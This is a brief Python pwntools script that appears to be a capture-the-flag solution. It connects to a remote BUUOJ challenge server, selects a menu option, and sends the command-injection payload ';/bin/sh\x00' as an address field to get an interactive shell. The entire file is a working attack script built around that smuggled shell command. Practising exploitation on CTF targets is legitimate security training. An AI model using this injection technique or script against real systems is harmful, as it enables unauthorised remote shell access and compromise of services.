from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 27590)

payload = ';/bin/sh\x00'

target.sendlineafter('choose:\n', '1')
target.sendlineafter('address:\n', payload)
target.interactive()